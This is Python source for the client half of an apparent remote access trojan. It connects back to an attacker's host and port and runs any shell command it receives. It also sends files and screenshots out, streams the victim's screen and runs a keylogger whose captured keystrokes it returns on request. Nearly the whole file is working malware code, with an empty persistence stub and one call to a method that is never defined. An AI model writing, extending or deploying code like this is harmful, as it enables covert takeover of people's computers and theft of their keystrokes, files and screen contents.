import socket
import os
import json
import subprocess
import random
import platform
import data
from mss import mss
from threading import Thread
from string import ascii_letters, digits
from keylogger.keylogger import Keylogger
from vidstream import ScreenShareClient
from time import sleep

class Client:
	def __init__(self, LHOST, LPORT):
		self.c_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.c_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.__lhost = LHOST
		self.__lport = int(LPORT)
		self.klogger = Keylogger()
		self.screen_share = ScreenShareClient(self.__lhost, 8532)
		self.__connect_to_server()


	def __connect_to_server(self):
        #self.target_ip = input('Enter ip --> ')
        #self.target_port = input('Enter port --> ')
		while True:
			sleep(5)
			try:
				self.c_socket.connect((self.__lhost,int(self.__lport)))
				self.__handle_server()
				break
			except:
				self.__connect_to_server()

	def __reliable_send(self, data):
		json_data = json.dumps(data)
		self.c_socket.send(json_data.encode())

	def __get_cwd(self):
		self.__reliable_send(os.getcwd())

	def __get_details(self):
		self.__reliable_send(f"{socket.gethostname()}|{os.getcwd()}")

	def __reliable_recv(self):
		data = ""
		while True:
			try:
				data += self.c_socket.recv(1024).decode().strip()
				return json.loads(data)
			except ValueError:
				continue



		# helper function to download files from the server
	def __download_file(self, filepath):
		basename = os.path.basename(filepath)

	    # checking if the file to be save exists, if it exists
	    # append some random chars to the filename
	    # using the rand_string() function which returns 5 random chars
		if os.path.exists(basename):
			filename_list = basename.split(".")
			filename = ".".join(filename_list[:-1])
			file_ext = filename_list[-1]
			full_filename = f"{filename}-{self.__rand_string()}.{file_ext}"
		else:
			full_filename = basename

	    # recieveing and saving the file
		with open(full_filename, "wb") as file:
			self.c_socket.settimeout(1)
			chunk = self.c_socket.recv(1024)
			while chunk:
				file.write(chunk)
				try:
					chunk = self.c_socket.recv(1024)
				except socket.timeout:
					break
			self.c_socket.settimeout(None)



	# helper function to send data to the server
	def __upload_file(self,filename_path):
		filesize = os.path.getsize(filename_path)
		self.__reliable_send(filesize)
		with open(filename_path, "rb") as file:
			data = file.read()
			self.c_socket.sendall(data)


	def __screenshot(self):
		with mss() as s_shot:
			s_shot.shot()

		filename = "monitor-1.png"
		self.__upload_file(filename)
	# helper function for generating some randoms chars
	# it returns a random combination of ascii chars and digits only
	def __rand_string(self):
		return "".join(random.SystemRandom().choice(ascii_letters + digits) for _ in range(5))

	def __execute_commands(self, cmd):
		proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		proc_result = proc.stdout.read() + proc.stderr.read()
		if not proc_result:
			self.__reliable_send(" ")
		else:
			self.__reliable_send(proc_result.decode())

	def __create_persistance(self, name):
		pass

	def __sysinfo(self):
		uname = platform.uname()
		sysinfo = f'''System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
'''
		return sysinfo

	

	def __handle_server(self):
		self.__get_details()
		while True:
			cmd = self.__reliable_recv()

			if cmd == "background":
				pass
			elif cmd == "quit":
				break
			elif cmd[:2] == "cd" and len(cmd) > 1:
				if cmd[:2] == "cd" and cmd[3:] == "":
					self.__get_cwd()
				elif os.path.exists(cmd[3:]) and cmd[3:] !="":
					os.chdir(cmd[3:])
					self.__get_cwd()
				else:
					self.__reliable_send("[!] FolderNotFoundError:The folder you're trying to access does not exist on the remote system")
			elif cmd[:14] == "create_persist":
				self.__create_persistance(cmd[15:].strip())
			elif cmd[:6] == "upload":
				self.__download_file(cmd[7:])
			elif cmd[:8] == "download":
				self.__upload_file(cmd[9:])
			elif cmd == "screenshot":
				self.__screenshot()
			elif cmd == "start_screenshare" or cmd == "stop_screenshare":
				try:
					if cmd == "start_screenshare":
						Thread(target=self.screen_share.start_stream).start()
					else:
						self.screen_share.stop_stream()
				except:
					continue

			elif cmd[:11] == "chwallpaper":
				self.__change_wallpaper(cmd[12:])
			elif cmd == "start_keycap":
				Thread(target=self.klogger.start_dumps).start()
				pass
			elif cmd == "dump_keycap":
				self.__reliable_send(self.klogger.dump_keys())
				pass
			elif cmd == "stop_keycap":
				self.klogger.stop_dumps()
				pass
			elif cmd[:5] == "start":
				try:
					subprocess.call(cmd, shell=True)
				except:
					continue
			elif cmd == "sysinfo":
				self.__reliable_send(self.__sysinfo())
	        # show user help
			elif cmd == "help":
				pass
			else:
				self.__execute_commands(cmd)


client = Client(data.lhost, data.lport)
